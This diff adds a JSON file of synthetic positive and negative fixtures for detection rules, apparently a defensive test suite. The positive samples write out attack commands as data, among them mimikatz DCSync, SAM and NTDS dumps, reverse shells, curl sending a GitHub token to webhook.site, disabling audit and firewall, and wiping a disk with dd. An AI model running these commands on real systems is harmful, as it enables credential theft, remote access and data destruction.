@@ -1,0 +1,532 @@
+{
+  "kind": "synthetic-contract-tests",
+  "not_a_precision_measurement": true,
+  "fixtures": [
+    {
+      "rule": "cred.registry-hives",
+      "positive": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "reg save HKLM\\SAM C:\\Temp\\sam.hive"
+      },
+      "negative": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "reg export HKLM\\Software\\MyApp app.reg"
+      }
+    },
+    {
+      "rule": "cred.ntds-ifm",
+      "positive": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "ntdsutil \"activate instance ntds\" ifm \"create full C:\\Temp\\out\""
+      },
+      "negative": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "ntdsutil help"
+      }
+    },
+    {
+      "rule": "cred.dcsync-command",
+      "positive": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "mimikatz.exe lsadump::dcsync /domain:lab.local /user:krbtgt"
+      },
+      "negative": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "repadmin /showrepl"
+      }
+    },
+    {
+      "rule": "cred.dpapi-command",
+      "positive": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "mimikatz dpapi::chrome /in:LoginData"
+      },
+      "negative": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "chrome --version"
+      }
+    },
+    {
+      "rule": "ad.shadow-credential-command",
+      "positive": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "certipy shadow auto -account svc-backup"
+      },
+      "negative": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "certipy find -stdout"
+      }
+    },
+    {
+      "rule": "ad.certificate-impersonation",
+      "positive": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "certipy req -template User -upn administrator@lab.local"
+      },
+      "negative": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "certipy req -template User -upn ana@lab.local"
+      }
+    },
+    {
+      "rule": "linux.setuid-writable",
+      "positive": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "chmod u+s /tmp/worker"
+      },
+      "negative": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "chmod 755 /opt/app/worker"
+      }
+    },
+    {
+      "rule": "linux.sudoers-unrestricted",
+      "positive": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "echo 'app ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers.d/app"
+      },
+      "negative": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "sudo visudo -c"
+      }
+    },
+    {
+      "rule": "linux.ssh-command-key",
+      "positive": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "echo 'command=\"bash -i /dev/tcp/192.0.2.1/4444\" ssh-ed25519 AAAA' >> ~/.ssh/authorized_keys"
+      },
+      "negative": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "ssh-keygen -t ed25519"
+      }
+    },
+    {
+      "rule": "persist.systemd-temp",
+      "positive": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "printf 'ExecStart=/dev/shm/agent' > /etc/systemd/system/cache.service"
+      },
+      "negative": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "systemctl status sshd"
+      }
+    },
+    {
+      "rule": "persist.macos-launch-temp",
+      "positive": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "launchctl load /tmp/com.example.agent.plist"
+      },
+      "negative": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "launchctl list"
+      }
+    },
+    {
+      "rule": "container.host-nsenter",
+      "positive": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "container.id": "c-a",
+        "process.command_line": "nsenter --target 1 --mount --pid /bin/sh"
+      },
+      "negative": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "container.id": "c-a",
+        "process.command_line": "nsenter --target 42 --mount /bin/true"
+      }
+    },
+    {
+      "rule": "container.runtime-api",
+      "positive": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "curl --unix-socket /var/run/docker.sock -d '{\"Privileged\":true}' http://localhost/containers/create"
+      },
+      "negative": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "curl --unix-socket /var/run/docker.sock http://localhost/version"
+      }
+    },
+    {
+      "rule": "stealth.timestomp-reference",
+      "positive": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "touch -r /bin/ls /dev/shm/.agent"
+      },
+      "negative": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "touch -r ./source ./build/output"
+      }
+    },
+    {
+      "rule": "defense.audit-disable",
+      "positive": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "auditctl -e 0"
+      },
+      "negative": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "auditctl -l"
+      }
+    },
+    {
+      "rule": "defense.firewall-disable",
+      "positive": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "netsh advfirewall set allprofiles state off"
+      },
+      "negative": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "netsh advfirewall show allprofiles"
+      }
+    },
+    {
+      "rule": "collect.domain-secrets",
+      "positive": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "tar -czf /tmp/archive.tgz /etc/shadow"
+      },
+      "negative": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "tar -czf /tmp/archive.tgz /var/log/app"
+      }
+    },
+    {
+      "rule": "c2.reverse-shell",
+      "positive": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "bash -i >& /dev/tcp/192.0.2.8/4444 0>&1"
+      },
+      "negative": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "curl https://example.org/health"
+      }
+    },
+    {
+      "rule": "c2.socat-exec",
+      "positive": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "socat TCP:192.0.2.8:4444 EXEC:/bin/sh"
+      },
+      "negative": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "socat TCP-LISTEN:9000 TCP:127.0.0.1:9001"
+      }
+    },
+    {
+      "rule": "exfil.secret-webhook",
+      "positive": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "curl https://webhook.site/test -d \"$GITHUB_TOKEN\""
+      },
+      "negative": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "curl https://api.github.com/user -H \"Authorization: Bearer $GITHUB_TOKEN\""
+      }
+    },
+    {
+      "rule": "impact.block-device",
+      "positive": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "dd if=/dev/zero of=/dev/sda bs=1M"
+      },
+      "negative": {
+        "event.category": "process",
+        "event.action": "process_start",
+        "event.outcome": "success",
+        "host.name": "lab-host",
+        "process.entity_id": "p-123",
+        "process.command_line": "dd if=/dev/zero of=/tmp/testfile bs=1M count=1"
+      }
+    },
+    {
+      "rule": "k8s.privileged-host-root",
+      "positive": {
+        "auditID": "audit-a",
+        "cluster.uid": "cluster",
+        "verb": "create",
+        "stage": "ResponseComplete",
+        "objectRef.resource": "pods",
+        "responseStatus.code": 201,
+        "requestObject.spec": {
+          "containers": [
+            {
+              "securityContext": {
+                "privileged": true
+              }
+            }
+          ],
+          "volumes": [
+            {
+              "hostPath": {
+                "path": "/"
+              }
+            }
+          ]
+        }
+      },
+      "negative": {
+        "auditID": "audit-a",
+        "cluster.uid": "cluster",
+        "verb": "create",
+        "stage": "ResponseComplete",
+        "objectRef.resource": "pods",
+        "responseStatus.code": 201,
+        "requestObject.spec": {
+          "containers": [
+            {
+              "securityContext": {
+                "privileged": false
+              }
+            }
+          ],
+          "volumes": [
+            {
+              "hostPath": {
+                "path": "/"
+              }
+            }
+          ]
+        }
+      }
+    },
+    {
+      "rule": "cloud.s3-public-read",
+      "positive": {
+        "eventSource": "s3.amazonaws.com",
+        "eventName": "PutBucketPolicy",
+        "userIdentity.accountId": "1",
+        "requestParameters.policy": {
+          "Statement": [
+            {
+              "Effect": "Allow",
+              "Principal": "*",
+              "Action": "s3:GetObject",
+              "Resource": "arn:aws:s3:::bucket/*"
+            }
+          ]
+        }
+      },
+      "negative": {
+        "eventSource": "s3.amazonaws.com",
+        "eventName": "PutBucketPolicy",
+        "userIdentity.accountId": "1",
+        "requestParameters.policy": {
+          "Statement": [
+            {
+              "Effect": "Deny",
+              "Principal": "*",
+              "Action": "s3:GetObject",
+              "Resource": "arn:aws:s3:::bucket/*"
+            }
+          ]
+        }
+      }
+    },
+    {
+      "rule": "saas.mail-forward-hide",
+      "positive": {
+        "event.category": "configuration",
+        "event.action": "mail_rule_change",
+        "event.outcome": "success",
+        "tenantId": "tenant-a",
+        "Operation": "New-InboxRule",
+        "Parameters": [
+          {
+            "Name": "ForwardTo",
+            "Value": "recipient@example.net"
+          },
+          {
+            "Name": "DeleteMessage",
+            "Value": "True"
+          }
+        ]
+      },
+      "negative": {
+        "event.category": "configuration",
+        "event.action": "mail_rule_change",
+        "event.outcome": "success",
+        "tenantId": "tenant-a",
+        "Operation": "New-InboxRule",
+        "Parameters": [
+          {
+            "Name": "ForwardTo",
+            "Value": "False"
+          },
+          {
+            "Name": "Description",
+            "Value": "recipient@example.net"
+          },
+          {
+            "Name": "DeleteMessage",
+            "Value": "True"
+          }
+        ]
+      }
+    }
+  ]
+}
